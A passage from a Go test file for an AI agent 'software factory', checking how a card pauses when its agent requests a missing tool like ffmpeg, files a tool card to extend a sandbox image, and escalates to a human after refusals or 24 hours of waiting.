	for _, tk := range []Task{
		{ID: asker, Status: "running", Repository: "sf/parks", IssueNumber: 41, Objective: "a"},
		{ID: other, Status: "running", Repository: "sf/parks", IssueNumber: 42, Objective: "b"},
		{ID: tool, Status: "queued", Repository: "sf/parks", IssueNumber: 50, Source: SourceToolRequest, Objective: "Add ffmpeg to image video\n\nCard #41 needs ffmpeg"},
	} {
		if err := s.CreateTask(ctx, tk); err != nil {
			t.Fatal(err)
		}
	}
	if _, ok, err := s.ImagePark(ctx, asker); err != nil || ok {
		t.Fatalf("no park yet: %v %v", ok, err)
	}
	p, err := s.ParkImage(ctx, ImagePark{Task: asker, Project: "parks", Target: "video", Tool: "ffmpeg", Need: "cut", ToolTask: tool}, true)
	if err != nil || p.CreatedAt.IsZero() || p.WokenAt != nil {
		t.Fatalf("park = %+v %v", p, err)
	}
	got, ok, err := s.ImagePark(ctx, asker)
	if err != nil || !ok || got.Target != "video" || got.Tool != "ffmpeg" || got.Need != "cut" || got.ToolTask != tool || got.ToolIssue != 50 ||
		!got.CreatedAt.Equal(p.CreatedAt) || got.WokenAt != nil || got.Refused != "" || got.Project != "parks" {
		t.Fatalf("read = %+v %v %v", got, ok, err)
	}
	if card, ok, err := s.OpenToolCard(ctx, "sf/parks", "video"); err != nil || !ok || card.ID != tool || card.IssueNumber != 50 {
		t.Fatalf("open tool card = %+v %v %v", card, ok, err)
	}
	for repo, target := range map[string]string{"sf/parks": "browser", "sf/other": "video"} {
		if _, ok, err := s.OpenToolCard(ctx, repo, target); err != nil || ok {
			t.Fatalf("%s's image %s has a card: %v %v", repo, target, ok, err)
		}
	}
	refused, err := s.ParkImage(ctx, ImagePark{Task: other, Project: "parks", Target: "sox", Tool: "sox", Refused: "the cap"}, false)
	if err != nil || refused.WokenAt == nil {
		t.Fatalf("a refused park = %+v %v, want it woken at once", refused, err)
	}
	open, err := s.OpenImageParks(ctx)
	if err != nil || len(open) != 1 || open[0].Task != asker || open[0].ToolIssue != 50 {
		t.Fatalf("open parks = %+v %v, want the asker's alone", open, err)
	}
	if parks, err := s.ProjectImageParks(ctx, "parks"); err != nil || len(parks) != 1 || parks[0].Task != asker || parks[0].Target != "video" || parks[0].ToolIssue != 50 {
		t.Fatalf("the project's parks = %+v %v, want the asker's alone", parks, err)
	}
	if parks, err := s.ProjectImageParks(ctx, "other"); err != nil || len(parks) != 0 {
		t.Fatalf("another project's parks = %+v %v, want none", parks, err)
	}
	// a stale wake names an earlier park: it wakes nothing
	if err := s.WakeImagePark(ctx, asker, p.CreatedAt.Add(-time.Second), ""); err != nil {
		t.Fatal(err)
	}
	if open, _ := s.OpenImageParks(ctx); len(open) != 1 {
		t.Fatalf("a stale wake woke %+v", open)
	}
	if err := s.WakeImagePark(ctx, asker, p.CreatedAt, "#50 closed without a merge"); err != nil {
		t.Fatal(err)
	}
	if open, _ := s.OpenImageParks(ctx); len(open) != 0 {
		t.Fatalf("open after the wake = %+v", open)
	}
	if got, _, _ := s.ImagePark(ctx, asker); got.WokenAt == nil || got.Refused != "#50 closed without a merge" {
		t.Fatalf("woken row = %+v", got)
	}
	// a new park replaces the row: open again, unrefused
	again, err := s.ParkImage(ctx, ImagePark{Task: asker, Project: "parks", Target: "video", Tool: "sox", Need: "mix", ToolTask: tool}, true)
	if err != nil || again.WokenAt != nil || !again.CreatedAt.After(p.CreatedAt) {
		t.Fatalf("new park = %+v %v", again, err)
	}
	if got, _, _ := s.ImagePark(ctx, asker); got.Refused != "" || got.Tool != "sox" || got.WokenAt != nil {
		t.Fatalf("replaced row = %+v", got)
	}
	// a card that ended parks no more
	if _, err := s.db.ExecContext(ctx, `UPDATE tasks SET status = 'closed', finished_at = now() WHERE id = $1`, asker); err != nil {
		t.Fatal(err)
	}
	if open, err := s.OpenImageParks(ctx); err != nil || len(open) != 0 {
		t.Fatalf("open parks of an ended card = %+v %v", open, err)
	}
	// a merged tool card is open no more
	if _, err := s.db.ExecContext(ctx, `UPDATE tasks SET status = 'merged', finished_at = now() WHERE id = $1`, tool); err != nil {
		t.Fatal(err)
	}
	if _, ok, err := s.OpenToolCard(ctx, "sf/parks", "video"); err != nil || ok {
		t.Fatalf("a merged tool card is open: %v %v", ok, err)
	}
	if err := s.SetObjective(ctx, tool, "Add ffmpeg to image video\n\nmore"); err != nil {
		t.Fatal(err)
	}
	if err := s.RecordImageRead(ctx, "parks", "video", "k-1", time.Date(2026, 10, 22, 12, 0, 0, 0, time.UTC)); err != nil {
		t.Fatal(err)
	}
	if at, err := s.ImageReadAt(ctx, "parks", "video", "k-1"); err != nil || !at.Equal(time.Date(2026, 10, 22, 12, 0, 0, 0, time.UTC)) {
		t.Fatalf("read at = %v %v", at, err)
	}
	if at, err := s.ImageReadAt(ctx, "parks", "video", "k-2"); err != nil || !at.IsZero() {
		t.Fatalf("a key no pass read = %v %v", at, err)
	}
}

// missingTool is a session the agent ended with request_tool.
func missingTool(session, tool, need string) SessionResult {
	return SessionResult{Outcome: OutcomeMissingTool, SessionID: session, Summary: "check-in: escalate after agent_tool_request: the agent called request_tool",
		Reason: AgentAsks + "a sandbox with " + tool + "\nWhy: " + need, Tool: tool, Need: need}
}

// onPark answers ParkForTool in order with parks, recording each ask as
// "tool|need", ImageArrived with the activity's line, recording each call
// as "image|tool" and its time, and LeaveImagePark, recording its tool
// card.
func (h *workflowHarness) onPark(parks ...ToolPark) {
	h.env.OnActivity(ActivityLeaveImagePark, mock.Anything, "t1", mock.Anything).Return(
		func(ctx context.Context, taskID, toolTask string) error {
			h.left = append(h.left, toolTask)
			return h.leaveErr
		})
	h.env.OnActivity(ActivityParkForTool, mock.Anything, "t1", mock.Anything, mock.Anything).Return(
		func(ctx context.Context, taskID, tool, need string) (ToolPark, error) {
			h.parked = append(h.parked, tool+"|"+need)
			return parks[min(len(h.parked), len(parks))-1], nil
		})
	h.env.OnActivity(ActivityImageArrived, mock.Anything, "t1", mock.Anything, mock.Anything).Return(
		func(ctx context.Context, taskID, image, tool string) (string, error) {
			h.arrived = append(h.arrived, image+"|"+tool)
			h.arrivedAt = append(h.arrivedAt, h.env.Now())
			if tool == "" {
				return "", nil
			}
			return "The tool " + tool + " arrived: this session runs on image " + image + " (" + tool + ").", nil
		})
}

var parkedAt = time.Date(2026, 10, 23, 9, 0, 0, 0, time.UTC)

func ffmpegPark() ToolPark {
	return ToolPark{Park: ImagePark{Target: "ffmpeg", Tool: "ffmpeg", Need: "cut the demo video", ToolTask: "t-tool", ToolIssue: 50, CreatedAt: parkedAt}}
}

// A session ending in missing_tool parks the card: the image_ready of its
// own park (a stale one, of an earlier park, is passed over) sets the
// card's image and starts the next session with the arrival in its
// findings; the asking session took no number of the cap.
func TestWorkflowMissingToolParksAndRestartsOnTheImage(t *testing.T) {
	h := newWorkflowHarness(t)
	start := h.env.Now()
	h.onSessions(missingTool("s1", "ffmpeg", "cut the demo video"), pushed("s2", "c2"))
	h.onChecks(ChecksResult{State: ChecksSuccess})
	h.onPark(ffmpegPark())
	h.signalAfter(time.Hour, SignalImageReady, TaskSignal{Image: "ffmpeg", At: parkedAt.Add(-time.Hour)})
	h.signalAfter(2*time.Hour, SignalImageReady, TaskSignal{Image: "ffmpeg", At: parkedAt})
	h.signalAfter(3*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
	if final := h.run(t); final != "done" {
		t.Fatalf("final = %q, finals %v", final, h.finals)
	}
	if !slices.Equal(h.parked, []string{"ffmpeg|cut the demo video"}) || !slices.Equal(h.arrived, []string{"ffmpeg|ffmpeg"}) || len(h.escalated) != 0 {
		t.Fatalf("parked %q, arrived %q, escalated %q", h.parked, h.arrived, h.escalated)
	}
	if at := h.arrivedAt[0].Sub(start); at < 2*time.Hour || at > 2*time.Hour+time.Minute {
		t.Fatalf("arrived after %s, want the own park's signal at 2h", at)
	}
	if len(h.sessions) != 2 || !slices.Contains(h.sessions[1].Findings, "The tool ffmpeg arrived: this session runs on image ffmpeg (ffmpeg).") {
		t.Fatalf("sessions = %+v, want the second with the arrival", h.sessions)
	}
	if s := h.sessions[1]; s.Attempt != 2 || s.Sessions != 4 {
		t.Fatalf("second session attempt %d of %d, want 2 of 4: the ask took no number", s.Attempt, s.Sessions)
	}
	if u := h.usage[len(h.usage)-1]; u.Attempts != 2 || u.ExtraAttempts != 1 {
		t.Fatalf("usage = %+v", u)
	}
}

// A refusal at the park reaches the next session at once, which runs on
// the card's image; the asking session took no number of the cap.
func TestWorkflowToolRefusalGoesToTheNextSession(t *testing.T) {
	h := newWorkflowHarness(t)
	h.onSessions(missingTool("s1", "sox", "mix"), pushed("s2", "c2"))
	h.onChecks(ChecksResult{State: ChecksSuccess})
	note := "The tool sox did not arrive: image sox would be new. This session runs on the image the card ran on before."
	h.onPark(ToolPark{Park: ImagePark{Target: "sox", Tool: "sox", Refused: "image sox would be new"}, Note: note})
	h.signalAfter(time.Hour, SignalPRMerged, TaskSignal{PR: 9})
	if final := h.run(t); final != "done" {
		t.Fatalf("final = %q", final)
	}
	if len(h.sessions) != 2 || !slices.Contains(h.sessions[1].Findings, note) || len(h.arrived) != 0 || len(h.escalated) != 0 {
		t.Fatalf("sessions %+v, arrived %q, escalated %q", h.sessions, h.arrived, h.escalated)
	}
	if h.sessions[1].Sessions != 4 {
		t.Fatalf("second session's cap %d, want 4", h.sessions[1].Sessions)
	}
}

// An ask the park sends to a human (a card refused before) asks it, as an
// escalation does; the answer runs the next session.
func TestWorkflowRepeatedToolRefusalAsksAHuman(t *testing.T) {
	h := newWorkflowHarness(t)
	h.onSessions(missingTool("s1", "sox", "mix"), pushed("s2", "c2"))
	h.onChecks(ChecksResult{State: ChecksSuccess})
	ask := toolAskedAgain + "sox on image sox, after the factory refused its last ask (sox on image sox): #50 closed without a merge\nWhy: mix\nRecommendation: see why #50 closed"
	h.onPark(ToolPark{Park: ImagePark{Target: "sox", Tool: "sox"}, Ask: ask})
	h.signalAfter(time.Hour, SignalHumanComment, TaskSignal{Author: "sebastian", Body: "do without sox", Comment: 700})
	h.signalAfter(2*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
	if final := h.run(t); final != "done" {
		t.Fatalf("final = %q", final)
	}
	if !slices.Equal(h.escalated, []string{ask}) {
		t.Fatalf("escalated %q, want %q", h.escalated, ask)
	}
	if len(h.sessions) != 2 || len(h.sessions[1].Answers) != 1 || h.sessions[1].Sessions != 4 {
		t.Fatalf("sessions = %+v", h.sessions)
	}
}

// A wake with a refusal (the tool card closed unmerged) keeps the image,
// leaves the park, so the card waits on its tool card no more, and tells
// the next session why.
func TestWorkflowImageRefusalAtTheWake(t *testing.T) {
	h := newWorkflowHarness(t)
	h.onSessions(missingTool("s1", "ffmpeg", "cut the demo video"), pushed("s2", "c2"))
	h.onChecks(ChecksResult{State: ChecksSuccess})
	h.onPark(ffmpegPark())
	h.signalAfter(time.Hour, SignalImageReady, TaskSignal{Image: "ffmpeg", Refusal: "#50 closed without a merge", At: parkedAt})
	h.signalAfter(2*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
	if final := h.run(t); final != "done" {
		t.Fatalf("final = %q", final)
	}
	want := "The tool ffmpeg did not arrive: #50 closed without a merge. This session runs on the image the card ran on before."
	if len(h.arrived) != 0 || len(h.sessions) != 2 || !slices.Contains(h.sessions[1].Findings, want) || !slices.Equal(h.left, []string{"t-tool"}) {
		t.Fatalf("arrived %q, sessions %+v, left %q", h.arrived, h.sessions, h.left)
	}
}

// 24 hours without a wake ask a human, naming the tool card and the
// image; the image's arrival ends that wait too, with no answer, and a
// human's answer ends the park on the card's image as it is. Every end
// but the image's arrival leaves the park, a decision within the 24 hours
// too.
func TestWorkflowParkAsksAHumanAfter24Hours(t *testing.T) {
	ask := "The card has waited 24 h for image ffmpeg, which tool card #50 adds ffmpeg to: is #50 or the image's build stuck?\n" +
		"Why: the card restarts on image ffmpeg once #50 has merged and the factory has built and pinned the image.\n" +
		"Recommendation: see that #50 merges and the image builds; answer to run the next session on the card's image as it is, or close this issue to end the card."
	t.Run("the image arrives", func(t *testing.T) {
		h := newWorkflowHarness(t)
		start := h.env.Now()
		h.onSessions(missingTool("s1", "ffmpeg", "cut the demo video"), pushed("s2", "c2"))
		h.onChecks(ChecksResult{State: ChecksSuccess})
		h.onPark(ffmpegPark())
		h.signalAfter(30*time.Hour, SignalImageReady, TaskSignal{Image: "ffmpeg", At: parkedAt})
		h.signalAfter(31*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
		if final := h.run(t); final != "done" {
			t.Fatalf("final = %q", final)
		}
		if !slices.Equal(h.escalated, []string{ask}) || escalationSource(ask) != "image" {
			t.Fatalf("escalated %q, want %q", h.escalated, ask)
		}
		if at := h.escalatedAt[0].Sub(start); at < 24*time.Hour || at > 24*time.Hour+time.Minute {
			t.Fatalf("asked after %s, want 24 h", at)
		}
		if !slices.Equal(h.arrived, []string{"ffmpeg|ffmpeg"}) || len(h.sessions) != 2 || len(h.sessions[1].Answers) != 0 || len(h.left) != 0 {
			t.Fatalf("arrived %q, sessions %+v, left %q", h.arrived, h.sessions, h.left)
		}
	})
	t.Run("a human answers", func(t *testing.T) {
		h := newWorkflowHarness(t)
		h.onSessions(missingTool("s1", "ffmpeg", "cut the demo video"), pushed("s2", "c2"))
		h.onChecks(ChecksResult{State: ChecksSuccess})
		h.onPark(ffmpegPark())
		h.signalAfter(26*time.Hour, SignalHumanComment, TaskSignal{Author: "sebastian", Body: "go on without it", Comment: 700})
		h.signalAfter(27*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
		if final := h.run(t); final != "done" {
			t.Fatalf("final = %q", final)
		}
		if len(h.arrived) != 0 || len(h.sessions) != 2 || len(h.sessions[1].Answers) != 1 || h.sessions[1].Sessions != 4 || !slices.Equal(h.left, []string{"t-tool"}) {
			t.Fatalf("arrived %q, sessions %+v, left %q", h.arrived, h.sessions, h.left)
		}
	})
	t.Run("the issue closes", func(t *testing.T) {
		h := newWorkflowHarness(t)
		h.onSessions(missingTool("s1", "ffmpeg", "cut the demo video"))
		h.onPark(ffmpegPark())
		h.signalAfter(5*time.Hour, SignalIssueClosed, TaskSignal{Author: "sebastian"})
		if final := h.run(t); final != "closed" {
			t.Fatalf("final = %q, finals %v", final, h.finals)
		}
		if len(h.escalated) != 0 || len(h.sessions) != 1 || !slices.Equal(h.left, []string{"t-tool"}) {
			t.Fatalf("escalated %q, sessions %d, left %q", h.escalated, len(h.sessions), h.left)
		}
	})
}

// A leave that fails after the activity's retries blocks none of the
// card's work, on every path: the card goes on as it would, and its
// timeline notes that the issue's dependency on the tool card stays.
func TestWorkflowParkKeptDependencyIsANote(t *testing.T) {
	kept := func(t *testing.T, h *workflowHarness) {
		t.Helper()
		for _, s := range h.recorded {
			if s.step == "image_park" && s.detail["tool_card"] == "t-tool" && s.detail["image"] == "ffmpeg" && s.detail["dependency_kept"] == "forgejo answered 422" {
				return
			}
		}
		t.Fatalf("recorded %+v, want the kept dependency noted", h.recorded)
	}
	leaveFails := temporal.NewNonRetryableApplicationError("forgejo answered 422", "forgejo", nil)
	t.Run("a refusal", func(t *testing.T) {
		h := newWorkflowHarness(t)
		h.onSessions(missingTool("s1", "ffmpeg", "cut the demo video"), pushed("s2", "c2"))
		h.onChecks(ChecksResult{State: ChecksSuccess})
		h.onPark(ffmpegPark())
		h.leaveErr = leaveFails
		h.signalAfter(time.Hour, SignalImageReady, TaskSignal{Image: "ffmpeg", Refusal: "#50 closed without a merge", At: parkedAt})
		h.signalAfter(2*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
		if final := h.run(t); final != "done" || len(h.sessions) != 2 {
			t.Fatalf("final = %q, sessions %d; want the card done", final, len(h.sessions))
		}
		kept(t, h)
	})
	t.Run("a human answers", func(t *testing.T) {
		h := newWorkflowHarness(t)
		h.onSessions(missingTool("s1", "ffmpeg", "cut the demo video"), pushed("s2", "c2"))
		h.onChecks(ChecksResult{State: ChecksSuccess})
		h.onPark(ffmpegPark())
		h.leaveErr = leaveFails
		h.signalAfter(26*time.Hour, SignalHumanComment, TaskSignal{Author: "sebastian", Body: "go on without it", Comment: 700})
		h.signalAfter(27*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
		if final := h.run(t); final != "done" || len(h.sessions) != 2 {
			t.Fatalf("final = %q, sessions %d; want the card done", final, len(h.sessions))
		}
		kept(t, h)
	})
	t.Run("the issue closes", func(t *testing.T) {
		h := newWorkflowHarness(t)
		h.onSessions(missingTool("s1", "ffmpeg", "cut the demo video"))
		h.onPark(ffmpegPark())
		h.leaveErr = leaveFails
		h.signalAfter(5*time.Hour, SignalIssueClosed, TaskSignal{Author: "sebastian"})
		if final := h.run(t); final != "closed" || strings.Contains(h.finals[len(h.finals)-1][1], "dependency") {
			t.Fatalf("final = %q, finals %v; want closed as decided", final, h.finals)
		}
		kept(t, h)
	})
}

// A session start whose image has no pin parks with no tool card and
// takes nothing: no attempt, no agent time; the pin's wake runs the
// session as the card's first.
func TestWorkflowImageNotPinnedParksWithoutCharge(t *testing.T) {
	h := newWorkflowHarness(t)
	h.onChecks(ChecksResult{State: ChecksSuccess})
	h.env.OnActivity(ActivityRunSession, mock.Anything, mock.Anything).Return(
		func(ctx context.Context, in SessionInput) (SessionResult, error) {
			h.sessions = append(h.sessions, in)
			if len(h.sessions) == 1 {
				e := ErrImageNotPinned{Project: "demo-app", Image: "video"}
				return SessionResult{}, temporal.NewNonRetryableApplicationError("namespace: "+e.Error(), errImageNotPinned, nil)
			}
			return pushed("s2", "c2"), nil
		})
	h.onPark(ToolPark{Park: ImagePark{Target: "video", CreatedAt: parkedAt}})
	h.signalAfter(time.Hour, SignalImageReady, TaskSignal{Image: "video", At: parkedAt})
	h.signalAfter(2*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
	if final := h.run(t); final != "done" {
		t.Fatalf("final = %q, finals %v", final, h.finals)
	}
	if !slices.Equal(h.parked, []string{"|"}) || !slices.Equal(h.arrived, []string{"video|"}) || len(h.escalated) != 0 {
		t.Fatalf("parked %q, arrived %q, escalated %q", h.parked, h.arrived, h.escalated)
	}
	if len(h.sessions) != 2 || h.sessions[1].Attempt != 1 || h.sessions[1].Sessions != 3 || len(h.sessions[1].Findings) != 0 {
		t.Fatalf("sessions = %+v, want the second as attempt 1 of 3, no finding", h.sessions)
	}
	if u := h.usage[len(h.usage)-1]; u.Attempts != 1 || u.ExtraAttempts != 0 {
		t.Fatalf("usage = %+v, want the one session that ran", u)
	}
}

// A run from before the tool park asks a human for the tool, as an
// escalation, and an unpinned image's start fails the session as before.
func TestWorkflowMissingToolBeforeTheChange(t *testing.T) {
	h := newWorkflowHarness(t)
	h.env.OnGetVersion("tool-park", workflow.DefaultVersion, versionToolPark).Return(workflow.DefaultVersion)
	h.onSessions(missingTool("s1", "ffmpeg", "cut"), pushed("s2", "c2"))
	h.onChecks(ChecksResult{State: ChecksSuccess})
	h.signalAfter(time.Hour, SignalHumanComment, TaskSignal{Author: "sebastian", Body: "added it", Comment: 700})
	h.signalAfter(2*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
	if final := h.run(t); final != "done" {
		t.Fatalf("final = %q", final)
	}
	if len(h.parked) != 0 || !slices.Equal(h.escalated, []string{missingTool("s1", "ffmpeg", "cut").Reason}) {
		t.Fatalf("parked %q, escalated %q", h.parked, h.escalated)
	}
}

// A park the imager woke already, which ParkForTool returns where the card
// asks again for the tool whose image arrived, puts the card on the image
// at once: no wait, no human.
func TestWorkflowParkOnAnArrivedImage(t *testing.T) {
	h := newWorkflowHarness(t)
	h.onSessions(missingTool("s1", "ffmpeg", "cut"), pushed("s2", "c2"))
	h.onChecks(ChecksResult{State: ChecksSuccess})
	p := ffmpegPark()
	woken := parkedAt.Add(time.Hour)
	p.Park.WokenAt = &woken
	h.onPark(p)
	h.signalAfter(time.Hour, SignalPRMerged, TaskSignal{PR: 9})
	if final := h.run(t); final != "done" {
		t.Fatalf("final = %q", final)
	}
	if !slices.Equal(h.arrived, []string{"ffmpeg|ffmpeg"}) || len(h.escalated) != 0 || len(h.sessions) != 2 ||
		!slices.Contains(h.sessions[1].Findings, "The tool ffmpeg arrived: this session runs on image ffmpeg (ffmpeg).") {
		t.Fatalf("arrived %q, escalated %q, sessions %+v", h.arrived, h.escalated, h.sessions)
	}
}

// A healed run of a parked card parks no second time: it waits for the
// rest of the 24 hours, then asks; a park the imager woke already ends
// at once.
func TestWorkflowHealedParkWaitsTheRest(t *testing.T) {
	t.Run("waiting", func(t *testing.T) {
		h := newWorkflowHarness(t)
		start := h.env.Now()
		p := ffmpegPark().Park
		p.CreatedAt = start.Add(-20 * time.Hour)
		h.state = RunState{Status: "waiting-image", Park: &p, Usage: TaskUsage{Attempts: 1}}
		h.onSessions(pushed("s2", "c2"))
		h.onChecks(ChecksResult{State: ChecksSuccess})
		h.onPark(ffmpegPark())
		h.signalAfter(6*time.Hour, SignalIssueClosed, TaskSignal{Author: "sebastian"})
		if final := h.run(t); final != "closed" {
			t.Fatalf("final = %q", final)
		}
		if len(h.parked) != 0 || len(h.escalated) != 1 || !strings.HasPrefix(h.escalated[0], imageWaited+"ffmpeg") {
			t.Fatalf("parked %q, escalated %q", h.parked, h.escalated)
		}
		if at := h.escalatedAt[0].Sub(start); at < 4*time.Hour || at > 4*time.Hour+time.Minute {
			t.Fatalf("asked after %s, want the remaining 4 h", at)
		}
	})
	t.Run("woken", func(t *testing.T) {
		h := newWorkflowHarness(t)
		woken := h.env.Now().Add(-time.Minute)
		p := ffmpegPark().Park
		p.WokenAt = &woken
		h.state = RunState{Status: "waiting-image", Park: &p, Usage: TaskUsage{Attempts: 1}}
		h.onSessions(pushed("s2", "c2"))
		h.onChecks(ChecksResult{State: ChecksSuccess})
		h.onPark(ffmpegPark())
		h.signalAfter(time.Hour, SignalPRMerged, TaskSignal{PR: 9})
		if final := h.run(t); final != "done" {
			t.Fatalf("final = %q", final)
		}
		if !slices.Equal(h.arrived, []string{"ffmpeg|ffmpeg"}) || len(h.sessions) != 1 || h.sessions[0].Attempt != 2 || h.sessions[0].Sessions != 4 {
			t.Fatalf("arrived %q, sessions %+v", h.arrived, h.sessions)
		}
	})
	t.Run("asked, and the ask fails", func(t *testing.T) {
		h := newWorkflowHarness(t)
		p := ffmpegPark().Park
		h.state = RunState{Status: "waiting-human", Park: &p, Question: imageWaited + "ffmpeg, which tool card #50 adds ffmpeg to: is #50 or the image's build stuck?",
			Usage: TaskUsage{Attempts: 1}}
		h.onPark(ffmpegPark())
		h.escalateErr = temporal.NewNonRetryableApplicationError("forgejo down", errTerminal, nil)
		if final := h.run(t); final != "failed" || !strings.HasPrefix(h.finals[len(h.finals)-1][1], escalateFailed) {
			t.Fatalf("final = %q, finals %v; want the failed ask", final, h.finals)
		}
		if !slices.Equal(h.left, []string{"t-tool"}) {
			t.Fatalf("left %q, want the park left", h.left)
		}
	})
	t.Run("asked", func(t *testing.T) {
		h := newWorkflowHarness(t)
		p := ffmpegPark().Park
		h.state = RunState{Status: "waiting-human", Park: &p, Question: imageWaited + "ffmpeg, which tool card #50 adds ffmpeg to: is #50 or the image's build stuck?",
			Usage: TaskUsage{Attempts: 1}}
		h.onSessions(pushed("s2", "c2"))
		h.onChecks(ChecksResult{State: ChecksSuccess})
		h.onPark(ffmpegPark())
		h.signalAfter(time.Hour, SignalImageReady, TaskSignal{Image: "ffmpeg", At: parkedAt})
		h.signalAfter(2*time.Hour, SignalPRMerged, TaskSignal{PR: 9})
		if final := h.run(t); final != "done" {
			t.Fatalf("final = %q", final)
		}
		if !slices.Equal(h.escalated, []string{healedReason}) || !slices.Equal(h.arrived, []string{"ffmpeg|ffmpeg"}) {
			t.Fatalf("escalated %q, arrived %q", h.escalated, h.arrived)
		}
	})
}

// A member's ask in the project chat files the same tool card a session's
// ask files, with no asking card: no parent, no dependency, no park; the
// member authors it. The body opens with who asked and why, and says what
// the image is for once it is pinned.
func TestRequestImageFilesAToolCard(t *testing.T) {
	const file = "images:\n  default:\n    apt: [jq]\n"
	r, store, rf, wf := parkRig(t, file, "default")
	ctx := context.Background()
	card, filed, err := r.RequestImage(ctx, codeRepo, "ffmpeg", "cut the demo video to 10 s.", "", "sebastian")
	if err != nil {
		t.Fatal(err)
	}
	if !filed || card.Source != SourceToolRequest || card.Parent != "" || card.Rung != RungCheap || card.Size != "small" || card.Lane != policy.LaneReady ||
		card.Status != "queued" || card.Priority != 0 || card.IssueNumber != 31 || card.Repository != codeRepo || card.Author != "sebastian" || !card.AuthorWriter {
		t.Fatalf("tool card = %+v, filed %v", card, filed)
	}
	body := "Requested in the project chat by sebastian: cut the demo video to 10 s.\n\n" +
		"Add ffmpeg to image ffmpeg in factory/images.yaml. After this card merges, the factory builds the image, signs it and pins it, " +
		"and cards that name image ffmpeg run on it, so it must still build and test this project.\n\n" +
		"Image default holds jq, sox and reaches no package registry. " +
		"Image ffmpeg starts as a copy of its entry under the new name; add ffmpeg to it:\n```\nimages:\n  ffmpeg:\n    apt:\n      - jq\n```\n\n" +
		"factory/images.yaml on main:\n```\n" + file + "```\n\n" +
		"The file's format, one complete example:\n```\n" + imagesExample + "```\n\n" +
		toolCardRules +
		"Acceptance:\n" +
		"- factory/images.yaml declares image ffmpeg, and ffmpeg is in it.\n" +
		"- factory/images.yaml passes the factory's check, which the policy gate runs on this pull request.\n\n" +
		"Size: small\nRung: cheap"
	if want := "Add ffmpeg to image ffmpeg\n\n" + body; store.tasks[card.ID].Objective != want {
		t.Fatalf("objective:\n%s\nwant:\n%s", store.tasks[card.ID].Objective, want)
	}
	if !slices.Equal(rf.issues, []string{"Add ffmpeg to image ffmpeg\n\n" + body}) {
		t.Fatalf("issues = %q", rf.issues)
	}
	if f := ReadyFindings("", store.tasks[card.ID].Objective, "small", nil); len(f) > 0 {
		t.Fatalf("the tool card fails the ready check: %q", f)
	}
	if !slices.Equal(wf.started, []string{card.ID}) || len(store.deps) != 0 || len(rf.deps) != 0 {
		t.Fatalf("started %v, deps %v, issue dependencies %v: want the card's workflow and no dependency", wf.started, store.deps, rf.deps)
	}
	for _, id := range []string{"t-asker", "t-second"} {
		if _, ok, _ := store.ImagePark(ctx, id); ok || store.tasks[id].Status != "running" {
			t.Fatalf("card %s parked or moved: %+v", id, store.tasks[id])
		}
	}
}

// The chat's tool card starts from the target's entry on main where there
// is one, else from default's, else from the factory image's stack; image
// default is the image of every card that names none.
func TestRequestImageStartsFromTheTargetsEntry(t *testing.T) {
	stack := func(name string) string {
		t.Helper()
		e, err := imagesEntry(name, FactoryStack())
		if err != nil {
			t.Fatal(err)
		}
		return e
	}
	for _, tc := range []struct {
		name, file   string
		pins         []string
		tool, image  string
		start, after string
		withoutAFile bool
	}{
		{name: "the target's entry", file: "images:\n  default:\n    apt: [jq]\n  video:\n    apt: [ffmpeg]\n    egress: [cdn.example.org]\n", pins: []string{"video"},
			tool: "sox", image: "video",
			start: "Image video holds ffmpeg and reaches cdn.example.org. Add sox to its entry:\n" +
				"```\nimages:\n  video:\n    apt:\n      - ffmpeg\n    egress:\n      - cdn.example.org\n```\n\n",
			after: "and cards that name image video run on it, so it must still build and test this project."},
		{name: "the target declared, not pinned", file: "images:\n  video:\n    apt: [ffmpeg]\n", tool: "sox", image: "video",
			start: "Image video has no pin in force. Add sox to its entry:\n```\nimages:\n  video:\n    apt:\n      - ffmpeg\n```\n\n",
			after: "and cards that name image video run on it, so it must still build and test this project."},
		{name: "default's entry", file: "images:\n  default:\n    apt: [jq]\n", tool: "ffmpeg",
			start: "Image default has no pin in force. Image ffmpeg starts as a copy of its entry under the new name; add ffmpeg to it:\n" +
				"```\nimages:\n  ffmpeg:\n    apt:\n      - jq\n```\n\n",
			after: "and cards that name image ffmpeg run on it, so it must still build and test this project."},
		{name: "the factory's stack", tool: "chromium", withoutAFile: true,
			start: "The factory's image is the sandbox base with Go 1.26 and Node 24 with npm. " +
				"Image chromium starts from this entry, the same stack; add chromium to it:\n```\n" + stack("chromium") + "```\n\n",
			after: "and cards that name image chromium run on it, so it must still build and test this project."},
		{name: "image default", tool: "jq", image: "default", withoutAFile: true,
			start: "The factory's image is the sandbox base with Go 1.26 and Node 24 with npm. " +
				"Image default starts from this entry, the same stack; add jq to it:\n```\n" + stack("default") + "```\n\n",
			after: "and every card that names no image runs on it, so it must still build and test this project."},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, store, _, _ := parkRig(t, tc.file, tc.pins...)
			if len(tc.pins) > 0 {
				c := r.cfg.Policy().Projects["ai-software-factory-code"]
				c.Images["video"] = policy.ImagePin{Digest: "sha256:" + strings.Repeat("d", 64), Key: keyDefault, Tools: []string{"ffmpeg"}, Egress: []string{"cdn.example.org"}}
			}
			card, _, err := r.RequestImage(context.Background(), codeRepo, tc.tool, "a need", tc.image, "sebastian")
			if err != nil {
				t.Fatal(err)
			}
			obj := store.tasks[card.ID].Objective
			if !strings.Contains(obj, tc.after+"\n\n"+tc.start) {
				t.Fatalf("objective %q lacks %q", obj, tc.after+"\n\n"+tc.start)
			}
			if tc.withoutAFile && !strings.Contains(obj, tc.start+"factory/images.yaml on main: none yet; create it.\n\n") {
				t.Fatalf("objective %q lacks the missing file", obj)
			}
		})
	}
}

// The chat's ask joins the open tool card of its image that no session
// has started, a session's or the chat's, with a line in its brief and a
// comment on its issue, each once; the same ask again changes nothing. A
// session's ask joins the chat's card as it joins any other. A started
// card is joined no more.
func TestRequestImageJoinsTheOpenCard(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	ctx := context.Background()
	for _, id := range []string{"t-asker", "t-second"} {
		tk := store.tasks[id]
		tk.Image = "video"
		store.tasks[id] = tk
	}
	first, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut the demo video")
	if err != nil {
		t.Fatal(err)
